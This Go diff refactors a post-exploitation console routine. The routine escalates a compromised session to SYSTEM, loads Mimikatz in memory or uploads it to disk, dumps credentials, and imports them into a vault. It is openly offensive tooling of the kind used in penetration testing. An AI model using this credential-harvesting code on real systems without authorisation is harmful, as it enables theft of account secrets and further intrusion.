@@ -295,39 +295,71 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 		// traceable back to the host it came from.
 		sessionID = target.BeaconID
 	}
+	command, mode, payload, custom, err := prepareMimikatzRun(req)
+	if err != nil {
+		return nil, err
+	}
+
+	result := &MimikatzResult{Command: command, SessionID: sessionID}
+
+	runOn, escalationNote, err := c.escalateMimikatzRun(target, req, result)
+	if err != nil {
+		return nil, err
+	}
+
+	executionNote, err := c.runMimikatzPayload(runOn, command, mode, payload, custom, req, result)
+	if err != nil {
+		return nil, err
+	}
+	if executionNote != "" {
+		result.Execution = strings.TrimSpace(result.Execution + " " + executionNote)
+	}
+
+	c.finishMimikatzRun(result, req, command, originUUID, escalationNote)
+	return result, nil
+}
+
+// prepareMimikatzRun resolves the command, mode and payload for a run.
+//
+// An empty Upload means "use the tool this console ships". A non-empty one is a
+// payload the operator supplied, which changes which in-memory loaders can
+// apply, so the distinction is carried into the run rather than flattened.
+func prepareMimikatzRun(req MimikatzRequest) (string, string, []byte, bool, error) {
 	command := strings.TrimSpace(req.Command)
 	if command == "" {
 		command = DefaultMimikatzCommand
 	}
 	mode := normalizeMimikatzMode(req.Mode)
-	// An empty Upload means "use the tool this console ships". A non-empty one is
-	// a payload the operator supplied, which changes which in-memory loaders can
-	// apply, so the distinction is carried into the run rather than flattened.
 	custom := len(req.Upload) > 0
 	payload := req.Upload
 	if !custom {
 		payload = embed.Mimikatz
 	}
 	if len(payload) == 0 {
-		return nil, errors.New("this build carries no mimikatz binary")
+		return "", "", nil, false, errors.New("this build carries no mimikatz binary")
 	}
+	return command, mode, payload, custom, nil
+}
 
-	result := &MimikatzResult{Command: command, SessionID: sessionID}
-
-	// Escalate before uploading or running anything. The check has to happen
-	// first: the failure it prevents is an access-denied from inside mimikatz,
-	// which the operator only sees after waiting out a ten-minute timeout, and
-	// which looks like a broken tool rather than an unelevated token.
-	//
-	// Elevation is best-effort. If it fails -- the token has no SeDebugPrivilege
-	// to inject with, or the host has no suitable SYSTEM process -- the run still
-	// proceeds on the original session and the result says so. Refusing to try
-	// would be worse than trying and reporting.
+// escalateMimikatzRun escalates before anything is uploaded or run, and returns
+// where the payload should actually go.
+//
+// The check has to happen first: the failure it prevents is an access-denied
+// from inside mimikatz, which the operator only sees after waiting out a
+// ten-minute timeout, and which looks like a broken tool rather than an
+// unelevated token.
+//
+// Elevation is best-effort. If it fails -- the token has no SeDebugPrivilege to
+// inject with, or the host has no suitable SYSTEM process -- the run still
+// proceeds on the original session and the result says so. Refusing to try would
+// be worse than trying and reporting.
+//
+// runOn is where the payload actually goes. Escalation can move it: GetSystem
+// produces a NEW session rather than elevating the current one, so a successful
+// escalation redirects every later step there. The original target is left alone
+// so the result still names what the operator asked for.
+func (c *Client) escalateMimikatzRun(target harvestTarget, req MimikatzRequest, result *MimikatzResult) (harvestTarget, string, error) {
 	var escalationNote string
-	// runOn is where the payload actually goes. Escalation can move it: GetSystem
-	// produces a NEW session rather than elevating the current one, so a
-	// successful escalation redirects every later step there. The parameter is
-	// left alone so the result still names what the operator asked for.
 	runOn := target
 	if req.Elevate == nil || *req.Elevate {
 		escalationNote = c.escalateForMimikatz(target, req.HostingProcess, result)
@@ -341,25 +373,30 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 		// resolve their target through the session table. Saying so is the point
 		// of this rework -- the previous code reached the same conclusion and
 		// reported it as an unelevated token.
-		return nil, fmt.Errorf(
+		return harvestTarget{}, "", fmt.Errorf(
 			"credential harvesting needs an interactive session, and this target is a %s "+
 				"whose escalation did not produce one. Open an interactive session from it "+
 				"(the console's beacon view has that action) and run the harvest there",
 			targetKind(target))
 	}
+	return runOn, escalationNote, nil
+}
 
-	// --- Execution ---------------------------------------------------------
-	//
-	// The in-memory route is attempted for every mode except an explicit upload.
-	// Auto falls back to the disk path when the payload cannot be injected; an
-	// explicit memory request is refused instead, because silently writing a
-	// file answers a question the operator did not ask.
+// runMimikatzPayload delivers the payload to runOn and fills in the result's
+// execution fields, returning a note about a fallback or cleanup for the caller
+// to fold into the message.
+//
+// The in-memory route is attempted for every mode except an explicit upload.
+// Auto falls back to the disk path when the payload cannot be injected; an
+// explicit memory request is refused instead, because silently writing a file
+// answers a question the operator did not ask.
+func (c *Client) runMimikatzPayload(runOn harvestTarget, command, mode string, payload []byte, custom bool, req MimikatzRequest, result *MimikatzResult) (string, error) {
 	var executionNote string
 	if mode != MimikatzModeUpload {
 		raw, note, err := c.runMimikatzInMemory(runOn.SessionID, command, payload, custom, req.Process)
 		if err != nil {
 			if mode == MimikatzModeMemory {
-				return nil, err
+				return "", err
 			}
 			executionNote = "内存加载不可用，已回退到上传执行（" + err.Error() + "）"
 			mode = MimikatzModeUpload
@@ -379,13 +416,13 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 		// as a launch failure that looks like a broken payload.
 		path := c.mimikatzTargetPath(runOn.SessionID)
 		if err := c.Upload(runOn.SessionID, path, payload); err != nil {
-			return nil, fmt.Errorf("upload %s: %w", path, err)
+			return "", fmt.Errorf("upload %s: %w", path, err)
 		}
 		// "exit" keeps the tool from dropping into its interactive prompt, which
 		// would hold the pipe open until the timeout instead of returning output.
 		out, err := c.executeWithTimeout(runOn.SessionID, path, []string{command, "exit"}, mimikatzTimeout)
 		if err != nil {
-			return nil, err
+			return "", err
 		}
 		result.Mode = MimikatzModeUpload
 		result.TargetPath = path
@@ -400,11 +437,13 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 			executionNote = note
 		}
 	}
+	return executionNote, nil
+}
 
-	if executionNote != "" {
-		result.Execution = strings.TrimSpace(result.Execution + " " + executionNote)
-	}
-
+// finishMimikatzRun optionally imports the parsed credentials and composes the
+// operator-facing message. It never fails: a harvest that succeeded is reported
+// even when the vault import did not.
+func (c *Client) finishMimikatzRun(result *MimikatzResult, req MimikatzRequest, command, originUUID, escalationNote string) {
 	if req.AutoAdd {
 		added, err := c.MimikatzImport(result.Parsed, originUUID)
 		if err != nil {
@@ -414,7 +453,7 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 			result.Added = 0
 			result.Message = fmt.Sprintf("parsed %d credential(s) but could not add them to the vault: %v",
 				len(result.Parsed), err)
-			return result, nil
+			return
 		}
 		result.Added = added
 	}
@@ -435,7 +474,6 @@ func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUU
 	if escalationNote != "" {
 		result.Message = escalationNote + "; " + result.Message
 	}
-	return result, nil
 }
 
 // diagnoseMimikatzFailure turns mimikatz's terse error codes into the reason and
